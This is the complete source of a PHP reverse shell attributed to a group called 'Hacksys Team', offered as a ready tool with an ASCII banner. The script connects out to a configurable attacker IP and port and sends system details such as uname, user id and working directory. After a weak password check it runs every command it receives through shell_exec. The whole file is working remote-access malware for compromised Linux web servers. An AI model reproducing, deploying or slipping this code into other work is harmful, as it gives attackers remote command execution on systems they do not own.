<?php
###################################################
#               Reverse Shell v1.0                #
#             Authentication Feature              #
#                                                 #
#            Hacksys Team - Panthera              #
#             Author: Ashfaq Ansari               #
#            hacksysteam@hotmail.com              #
#          http://hacksys.vfreaks.com             #
#              Designed for Linux                 #
#             Thanks to lionaneesh                #
#             lionaneesh@gmail.com                #
###################################################

ini_set('max_execution_time' ,0);

$VERSION = "1.0";
$ip = "127.0.0.1"; #Change this
$port = 4444;      #Change this
$password = base64_decode("aGFja3N5c3RlYW0="); #Default Password: hacksysteam (MD5)

$banner = ("
 _    _            _     _____            
| |  | |          | |   / ____|                            
| |__| | __ _  ___| | _| (___  _   _ ___
|  __  |/ _` |/ __| |/ /\___ \| | | / __|
| |  | | (_| | (__|   < ____) | |_| \__ \
|_|  |_|\__,_|\___|_|\_\_____/ \__, |___/
 _______                        __/ |                                
|__   __|                      |___/  
   | | ___  __ _ _ __ ___  
   | |/ _ \/ _` | '_ ` _ \
   | |  __/ (_| | | | | | |
   |_|\___|\__,_|_| |_| |_|
   
    Reverse Shell in PHP
    Author: Ashfaq Ansari
   hacksysteam@hotmail.com
 http://hacksys.vfreaks.com/\n\n");

$pwd = shell_exec("pwd");
$sysinfo = shell_exec("uname -a");
$id = shell_exec('id | cut -d "(" -f 2 | cut -d ")" -f 1' );
$date = shell_exec("date");
$len = 1337;
$info =
("
System Information:\n$sysinfo
Current Working Directory: $pwd
User Group: $id
Current Date and Time: $date\n
");

print "\nTrying to connect to: $ip on port $port ...\n\n";

$sockfd = fsockopen($ip , $port , $errno, $errstr );

if($errno != 0)
  {
    print "\n****** Error Occured ******\nError Nnumber: $errno\nError String: $errstr\n\n";
    die(0);
  }
else if (!$sockfd)
  {
    print "Fatal : An unexpected error was occured when trying to connect!\n";
  }
else
  {
    print "Connected to: $ip on port $port ...\n\n";
    fputs ($sockfd , $banner);
    fputs($sockfd ,"Enter Password: ");
    $getpass = trim(fgets($sockfd, strlen($password) + 2));

    if ($getpass == $password)
    {
      fputs($sockfd, "\nAuthentication Successfull..\n");
      fputs($sockfd, $info);
      while(!feof($sockfd))
      {
    $cmdPrompt = trim($id) . "@" . trim($ip) . ":~" . trim($pwd) . "# ";
    fputs ($sockfd , $cmdPrompt );
    $command = trim(fgets($sockfd, $len));
        if (trim($command) == "exit")
    {
      fputs($sockfd ,"\nAborted by user... Exiting..." );
      fclose($sockfd);
      die(0);
    }
    fputs($sockfd , "\n" . shell_exec($command) . "\n");
      }
      fclose($sockfd);
      die(0);
    }
    else
    {
      fputs($sockfd ,"\nInvalid Password... Quitting...");
      fclose($sockfd);
      die(0);
    }
  }
?>

